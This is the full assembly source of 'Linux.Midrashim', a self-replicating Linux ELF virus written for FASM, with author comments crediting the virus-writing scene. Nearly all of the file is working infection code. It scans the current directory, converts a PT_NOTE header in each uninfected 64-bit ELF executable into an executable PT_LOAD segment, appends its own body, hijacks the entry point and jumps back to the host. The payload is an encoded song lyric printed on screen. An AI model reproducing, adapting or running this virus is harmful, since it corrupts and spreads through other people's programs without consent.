; Linux.Midrashim by TMZ

; Finished on 30.05.2020
; Released on 07.11.2020
; The release was delayed because I was trying to code a fancy 90's style payload and due to lack of time, I'll leave this to another project.
; This is my first full assembly virus and it uses FASM (https://flatassembler.net).
;   - relies on PT_NOTE -> PT_LOAD infection technique and should work on any 64bit ELF executable (position independent or not).
;   - should use mmap but instead it uses pread and pwrite (I'm lazy). 
;   - stores stuff on memory buffer (r15 register).
;   - infects current directory (non recursively).
; Payload (non destructive) is a quote from a song and it's encoded for no reason whatsoever.
; 
; A big thanks for those who keeps the VX scene alive!
; Feel free to email me: tmz@null.net || || tmz@syscall.sh || thomazi@linux.com
; @TMZvx || @guitmz
; https://www.guitmz.com
; https://syscall.sh
;
; Use at your own risk, I'm not responsible for any damages that this may cause.
;
;             &                 &               
;           &                     &             
;        &&&                       &&&          
;        &&                         &&          
;        &&&        &     &        &&&          
;       &&&&     &&         &&     &&&&         
;     &&&        &           &        &&&       
;   &&&&#         &&       &&         &&&&&     
;  &&&&&&          &&&& &&&&          &&&&&#    
;     &&&&&.        &&   &&        %&&&&&       
;       &&&&.        &  .&        &&&&&         
;        &&&&                     &&&&          
;        &&&&&&&&             &&&&&&&&          
;         &&&&&&&&&   & &   &&&&&&&&&           
;         &&     &&&&&& &&&&&&     &&           
;        &&        &&&& &&&%       *&&          
;         &          && &&          &           
;          &         && &&         &            
;           &         & &         &             
;                     & &                       
;                     & &                       
;                     & &                       
;                     & &   
;
; References:
; https://www.symbolcrash.com/2019/03/27/pt_note-to-pt_load-injection-in-elf
; https://www.wikidata.org/wiki/Q6041496
; https://legacyofkain.fandom.com/wiki/Ozar_Midrashim
; https://en.wikipedia.org/wiki/Don%27t_Be_Afraid_(album)

format ELF64 executable 3

SYS_EXIT        = 60
SYS_OPEN        = 2
SYS_CLOSE       = 3
SYS_WRITE       = 1
SYS_READ        = 0
SYS_EXECVE      = 59
SYS_GETDENTS64  = 217
SYS_FSTAT       = 5
SYS_LSEEK       = 8
SYS_PREAD64     = 17
SYS_PWRITE64    = 18
SYS_SYNC        = 162
EHDR_SIZE       = 64
O_RDONLY        = 0
O_RDWR          = 2
SEEK_END        = 2
DIRENT_BUFSIZE  = 1024
MFD_CLOEXEC     = 1
DT_REG          = 8
PT_LOAD         = 1
PT_NOTE         = 4
PF_X            = 1
PF_R            = 4

; r15 + 0 = stack buffer (10000 bytes) = stat
; r15 + 48 = stat.st_size
; r15 + 144 = ehdr
; r15 + 152 = ehdr.pad
; r15 + 168 = ehdr.entry
; r15 + 176 = ehdr.phoff
; r15 + 198 = ehdr.phentsize
; r15 + 200 = ehdr.phnum
; r15 + 208 = phdr = phdr.type
; r15 + 212 = phdr.flags
; r15 + 216 = phdr.offset
; r15 + 224 = phdr.vaddr
; r15 + 232 = phdr.paddr
; r15 + 240 = phdr.filesz
; r15 + 248 = phdr.memsz
; r15 + 256 = phdr.align
; r15 + 300 = jmp rel
; r15 + 350 = directory size
; r15 + 400 = dirent = dirent.d_ino
; r15 + 416 = dirent.d_reclen
; r15 + 418 = dirent.d_type
; r15 + 419 = dirent.d_name
; r15 + 3000 = decoded payload

segment readable executable
entry v_start

v_start:
    push rdx
    push rsp
    sub rsp, 4000                                               ; reserving 1000 dwords (4000 bytes)
    mov r15, rsp                                                ; r15 has the reserved stack buffer address

    load_dir:
        push "."                                                ; pushing "." to stack (rsp)
        mov rdi, rsp                                            ; moving "." to rdi
        mov rsi, O_RDONLY
        xor rdx, rdx                                            ;not using any flags
        mov rax, SYS_OPEN
        syscall                                                 ; rax contains the fd

        cmp rax, 0                                              ; if can't open file, exit now
        jbe v_stop

        mov rdi, rax                                            ; move fd to rdi
        lea rsi, [r15 + 400]                                    ; rsi = dirent = [r15 + 400]
        mov rdx, DIRENT_BUFSIZE                                 ; buffer with maximum directory size
        mov rax, SYS_GETDENTS64
        syscall                                                 ; dirent contains the directory entries

        test rax, rax                                           ; check directory list was successful
        js v_stop                                               ; if negative code is returned, I failed and should exit

        mov qword [r15 + 350], rax                              ; [r15 + 350] now holds directory size

        mov rax, SYS_CLOSE                                      ; close source fd in rdi
        syscall

        xor rcx, rcx                                            ; will be the position in the directory entries

    file_loop:
        push rcx                                                ; preserving rcx (important!!!)
        cmp byte [rcx + r15 + 418], DT_REG                      ; check if it's a regular file dirent.d_type = [r15 + 418]
        jne .continue                                           ; if not, proceed to next file

        .open_target_file:
            lea rdi, [rcx + r15 + 419]                          ; dirent.d_name = [r15 + 419]
            mov rsi, O_RDWR
            xor rdx, rdx                                        ; not using any flags
            mov rax, SYS_OPEN                                   ; SYS_OPEN
            syscall

            cmp rax, 0                                          ; if can't open file, exit now
            jbe .continue
            mov r9, rax                                         ; r9 contains target fd

        .read_ehdr:
            mov rdi, r9                                         ; r9 contains fd
            lea rsi, [r15 + 144]                                ; rsi = ehdr = [r15 + 144]
            mov rdx, EHDR_SIZE                                  ; ehdr.size
            mov r10, 0                                          ; read at offset 0
            mov rax, SYS_PREAD64                                ; SYS_PREAD64
            syscall

        .is_elf:
            cmp dword [r15 + 144], 0x464c457f                   ; 0x464c457f means .ELF (dword, little-endian)
            jnz .close_file                                     ; not an ELF binary, close and continue to next file if any

        .is_infected:
            cmp dword [r15 + 152], 0x005a4d54                   ; check signature in [r15 + 152] ehdr.pad (TMZ in little-endian, plus trailing zero to fill up a word size)
            jz .close_file                                      ; already infected, close and continue to next file if any

            mov r8, [r15 + 176]                                 ; r8 now holds ehdr.phoff from [r15 + 176]
            xor rbx, rbx                                        ; initializing phdr loop counter in rbx
            xor r14, r14                                        ; r14 will hold phdr file offset

        .loop_phdr:
            mov rdi, r9                                         ; r9 contains fd
            lea rsi, [r15 + 208]                                ; rsi = phdr = [r15 + 208]
            mov dx, word [r15 + 198]                            ; ehdr.phentsize is at [r15 + 198]
            mov r10, r8                                         ; read at ehdr.phoff from r8 (incrementing ehdr.phentsize each loop iteraction)
            mov rax, SYS_PREAD64                                ; SYS_PREAD64
            syscall

            cmp byte [r15 + 208], PT_NOTE                       ; check if phdr.type in [r15 + 208] is PT_NOTE (4)
            jz .infect                                          ; if yes, jackpot, start infecting

            inc rbx                                             ; if not, increase rbx counter
            cmp bx, word [r15 + 200]                            ; check if we looped through all phdrs already (ehdr.phnum = [r15 + 200])
            jge .close_file                                     ; exit if no valid phdr for infection was found

            add r8w, word [r15 + 198]                           ; otherwise, add current ehdr.phentsize from [r15 + 198] into r8w
            jnz .loop_phdr                                      ; read next phdr

        .infect:
            .get_target_phdr_file_offset:
                mov ax, bx                                      ; loading phdr loop counter bx to ax
                mov dx, word [r15 + 198]                        ; loading ehdr.phentsize from [r15 + 198] to dx
                imul dx                                         ; bx * ehdr.phentsize
                mov r14w, ax
                add r14, [r15 + 176]                            ; r14 = ehdr.phoff + (bx * ehdr.phentsize)

            .file_info:
                mov rdi, r9
                mov rsi, r15                                    ; rsi = r15 = stack buffer address
                mov rax, SYS_FSTAT                              ; SYS_FSTAT
                syscall                                         ; stat.st_size = [r15 + 48]

            .append_virus:
                ; getting target EOF
                mov rdi, r9                                     ; r9 contains fd
                mov rsi, 0                                      ; seek offset 0
                mov rdx, SEEK_END                               ; SEEK_END
                mov rax, SYS_LSEEK                              ; SYS_LSEEK
                syscall                                         ; getting target EOF offset in rax
                push rax                                        ; saving target EOF

                call .delta                 ; push and jmp instead of call?
                .delta:
                    pop rbp
                    sub rbp, .delta

                ; writing virus body to EOF
                mov rdi, r9                                     ; r9 contains fd
                lea rsi, [rbp + v_start]                        ; loading v_start address in rsi
                mov rdx, v_stop - v_start                       ; virus size
                mov r10, rax                                    ; rax contains target EOF offset from previous syscall
                mov rax, SYS_PWRITE64                           ; SYS_PWRITE64
                syscall

                cmp rax, 0
                jbe .close_file

            .patch_phdr:
                mov dword [r15 + 208], PT_LOAD                  ; change phdr type in [r15 + 208] from PT_NOTE to PT_LOAD (1)
                mov dword [r15 + 212], PF_R or PF_X             ; change phdr.flags in [r15 + 212] to PF_X (1) | PF_R (4)
                pop rax                                         ; restoring target EOF offeset into rax
                mov [r15 + 216], rax                            ; phdr.offset [r15 + 216] = target EOF offset
                mov r13, [r15 + 48]                             ; storing target stat.st_size from [r15 + 48] in r13
                add r13, 0xc000000                              ; adding 0xc000000 to target file size
                mov [r15 + 224], r13                            ; changing phdr.vaddr in [r15 + 224] to new one in r13 (stat.st_size + 0xc000000)
                mov qword [r15 + 256], 0x200000                 ; set phdr.align in [r15 + 256] to 2mb
                add qword [r15 + 240], v_stop - v_start + 5     ; add virus size to phdr.filesz in [r15 + 240] + 5 for the jmp to original ehdr.entry
                add qword [r15 + 248], v_stop - v_start + 5     ; add virus size to phdr.memsz in [r15 + 248] + 5 for the jmp to original ehdr.entry

                ; writing patched phdr
                mov rdi, r9                                     ; r9 contains fd
                mov rsi, r15                                    ; rsi = r15 = stack buffer address
                lea rsi, [r15 + 208]                            ; rsi = phdr = [r15 + 208]
                mov dx, word [r15 + 198]                        ; ehdr.phentsize from [r15 + 198]
                mov r10, r14                                    ; phdr from [r15 + 208]
                mov rax, SYS_PWRITE64                           ; SYS_PWRITE64
                syscall

                cmp rax, 0
                jbe .close_file

            .patch_ehdr:
                ; patching ehdr
                mov r14, [r15 + 168]                            ; storing target original ehdr.entry from [r15 + 168] in r14
                mov [r15 + 168], r13                            ; set ehdr.entry in [r15 + 168] to r13 (phdr.vaddr)
                mov r13, 0x005a4d54                             ; loading virus signature into r13 (TMZ in little-endian)
                mov [r15 + 152], r13                            ; adding the virus signature to ehdr.pad in [r15 + 152]

                ; writing patched ehdr
                mov rdi, r9                                     ; r9 contains fd
                lea rsi, [r15 + 144]                            ; rsi = ehdr = [r15 + 144]
                mov rdx, EHDR_SIZE                              ; ehdr.size
                mov r10, 0                                      ; ehdr.offset
                mov rax, SYS_PWRITE64                           ; SYS_PWRITE64
                syscall

                cmp rax, 0
                jbe .close_file

            .write_patched_jmp:
                ; getting target new EOF
                mov rdi, r9                                     ; r9 contains fd
                mov rsi, 0                                      ; seek offset 0
                mov rdx, SEEK_END                               ; SEEK_END
                mov rax, SYS_LSEEK                              ; SYS_LSEEK
                syscall                                         ; getting target EOF offset in rax

                ; creating patched jmp
                ; e9 00 00 00 00
                ; patchedEntryJump := originalEntryPoint - (patched phdr.vaddr + 5) - virus_size
                mov rdx, [r15 + 224]                            ; rdx = phdr.vaddr
                add rdx, 5
                sub r14, rdx
                sub r14, v_stop - v_start
                mov byte [r15 + 300 ], 0xe9
                mov dword [r15 + 301], r14d

                ; writing patched jmp to EOF
                mov rdi, r9                                     ; r9 contains fd
                lea rsi, [r15 + 300]                            ; rsi = patched jmp in stack buffer = [r15 + 208]
                mov rdx, 5                                      ; size of jmp rel
                mov r10, rax                                    ; mov rax to r10 = new target EOF
                mov rax, SYS_PWRITE64                           ; SYS_PWRITE64
                syscall

                cmp rax, 0
                jbe .close_file

                mov rax, SYS_SYNC                               ; SYS_SYNC
                syscall

        .close_file:
            mov rax, SYS_CLOSE                                  ; close source fd in rdi
            syscall

        .continue:
            pop rcx
            add cx, word [rcx + r15 + 416]                      ; adding directory record lenght to cx (lower rcx, for word)
            cmp rcx, qword [r15 + 350]                          ; comparing rcx counter with r10 (directory records total size)
            jne file_loop                                       ; if counter is not the same, continue loop. Exit virus otherwise


    ; push and jump technique works but only in original virus
	; push msg		; push msg label address to stack
	; jmp payload             ; jmp to payload label (this and the above line simulate "call payload" instruction)

    call payload ; works all the time but shows in disassembler as function call
    ; 1337 encoded payload, very hax0r
    msg:
        db 0x59, 0x7c, 0x95, 0x95, 0x57, 0x9e, 0x9d, 0x57
        db 0xa3, 0x9f, 0x92, 0x57, 0x93, 0x9e, 0xa8, 0xa3
        db 0x96, 0x9d, 0x98, 0x92, 0x57, 0x7e, 0x57, 0x98
        db 0x96, 0x9d, 0x57, 0xa8, 0x92, 0x92, 0x57, 0x96
        db 0x57, 0x9f, 0xa2, 0x94, 0x92, 0x57, 0x9f, 0x9c
        db 0x9b, 0x9c, 0x94, 0xa9, 0x96, 0xa7, 0x9f, 0x9e
        db 0x98, 0x57, 0x89, 0x9c, 0x9d, 0x96, 0x9b, 0x93
        db 0x57, 0x7a, 0x98, 0x73, 0x9c, 0x9d, 0x96, 0x9b
        db 0x93, 0x57, 0xa4, 0x96, 0x9b, 0xa0, 0x9e, 0x9d
        db 0x94, 0x57, 0x99, 0x92, 0xa3, 0xa4, 0x92, 0x92
        db 0x9d, 0x57, 0xa3, 0x9f, 0x92, 0x57, 0x94, 0xa9
        db 0x96, 0x9e, 0x9d, 0x57, 0x92, 0x9b, 0x92, 0xa5
        db 0x96, 0xa3, 0x9c, 0xa9, 0xa8, 0x57, 0x96, 0x9d
        db 0x93, 0x57, 0xa3, 0xa9, 0x92, 0x92, 0xa8, 0x41
        db 0x7c, 0x9f, 0x5b, 0x57, 0x9e, 0x95, 0x57, 0x7e
        db 0x57, 0x9f, 0x96, 0x93, 0x57, 0xa3, 0x9f, 0x92
        db 0x57, 0x9a, 0x9c, 0x9d, 0x92, 0xae, 0x57, 0x7e
        db 0x54, 0x93, 0x57, 0x9f, 0x96, 0xa5, 0x92, 0x57
        db 0x54, 0x92, 0x9a, 0x57, 0x9a, 0x96, 0xa0, 0x92
        db 0x57, 0x9c, 0x9d, 0x92, 0x57, 0x9c, 0x95, 0x57
        db 0xa3, 0x9f, 0x9c, 0xa8, 0x92, 0x57, 0x9a, 0x92
        db 0x5b, 0x57, 0xa3, 0x9f, 0x92, 0x9d, 0x57, 0x7e
        db 0x54, 0x93, 0x57, 0xa8, 0x92, 0x9d, 0x93, 0x57
        db 0x9a, 0xae, 0xa8, 0x92, 0x9b, 0x95, 0x57, 0xa3
        db 0x9c, 0x57, 0xa8, 0xa3, 0x96, 0x9b, 0xa0, 0x57
        db 0xa3, 0x9f, 0x92, 0x57, 0x9b, 0x96, 0x9d, 0x93
        db 0xa8, 0x98, 0x96, 0xa7, 0x92, 0x57, 0x96, 0x9d
        db 0x93, 0x57, 0xa8, 0x98, 0x96, 0xa9, 0x92, 0x57
        db 0x92, 0xa5, 0x92, 0xa9, 0xae, 0x99, 0x9c, 0x93
        db 0xae, 0x41, 0x8e, 0x9c, 0xa2, 0x57, 0xa8, 0x92
        db 0x92, 0x5b, 0x57, 0x54, 0x98, 0x96, 0xa2, 0xa8
        db 0x92, 0x57, 0x7e, 0x57, 0x94, 0x9c, 0xa3, 0x57
        db 0xa3, 0x9f, 0x9e, 0xa8, 0x57, 0xa8, 0x9c, 0xa9
        db 0xa3, 0x57, 0x9c, 0x95, 0x57, 0x95, 0x9e, 0x92
        db 0x9b, 0x93, 0x57, 0x99, 0x92, 0x9f, 0x9e, 0x9d
        db 0x93, 0x57, 0x9a, 0x92, 0x5d, 0x57, 0x79, 0x92
        db 0x98, 0x96, 0xa2, 0xa8, 0x92, 0x5d, 0x5d, 0x5d
        db 0x57, 0x54, 0x98, 0x96, 0xa2, 0xa8, 0x92, 0x57
        db 0x7e, 0x54, 0xa5, 0x92, 0x57, 0x94, 0x9c, 0xa3
        db 0x57, 0xa8, 0xa7, 0x9e, 0xa0, 0x92, 0xa8, 0x41
        db 0x79, 0x92, 0x98, 0x96, 0xa2, 0xa8, 0x92, 0x57
        db 0x7e, 0x57, 0x94, 0x9c, 0x57, 0x99, 0x92, 0xa3
        db 0xa4, 0x92, 0x92, 0x9d, 0x57, 0xa3, 0x9f, 0x92
        db 0x57, 0xb1, 0x9c, 0x9d, 0x92, 0xa8, 0x5b, 0x57
        db 0x92, 0xa5, 0x92, 0x9d, 0x57, 0xa4, 0x9f, 0x92
        db 0x9d, 0x57, 0x7e, 0x54, 0x9a, 0x57, 0x9d, 0x9c
        db 0xa3, 0x57, 0xa8, 0xa2, 0xa7, 0xa7, 0x9c, 0xa8
        db 0x92, 0x93, 0x57, 0xa3, 0x9c, 0x41, 0x79, 0x92
        db 0x98, 0x96, 0xa2, 0xa8, 0x92, 0x57, 0x7e, 0x54
        db 0x9a, 0x57, 0x96, 0x57, 0xa8, 0xa2, 0xa8, 0xa7
        db 0x9e, 0x98, 0x9e, 0x9c, 0xa2, 0xa8, 0x57, 0xa7
        db 0x92, 0xa9, 0xa8, 0x9c, 0x9d, 0x57, 0xa9, 0x92
        db 0xa7, 0x9c, 0xa9, 0xa3, 0x57, 0x41, 0x76, 0x9d
        db 0x93, 0x57, 0x9e, 0xa3, 0x54, 0xa8, 0x57, 0xa3
        db 0x9e, 0x9a, 0x92, 0x57, 0xa3, 0x9c, 0x57, 0x94
        db 0x9c, 0x57, 0xa8, 0x9f, 0x9c, 0xa7, 0xa7, 0x9e
        db 0x9d, 0x94, 0x5d, 0x59, 0x41, 0x37
        len = $-msg

    payload:
        pop rsi
        mov rcx, len
        lea rdi, [r15 + 3000]

        .decode:
            lodsb                                               ; load byte from rsi into al
            sub  al, 50
            xor  al, 5
            stosb                                               ; store byte from al into rdi
            loop .decode                                        ; sub 1 from rcx and continue loop until rcx = 0

        lea rsi, [r15 + 3000]                                   ; decoded payload is at [r15 + 3000]
        mov rax, SYS_WRITE
        mov rdi, 1                                              ; STDOUT
        mov rdx, len
        syscall
    
    add rsp, 4008
    pop rsp
    pop rdx
v_stop:
    ; virus body stop (host program start)
    xor rdi, rdi                                                ; exit code 0
    mov rax, SYS_EXIT
    syscall
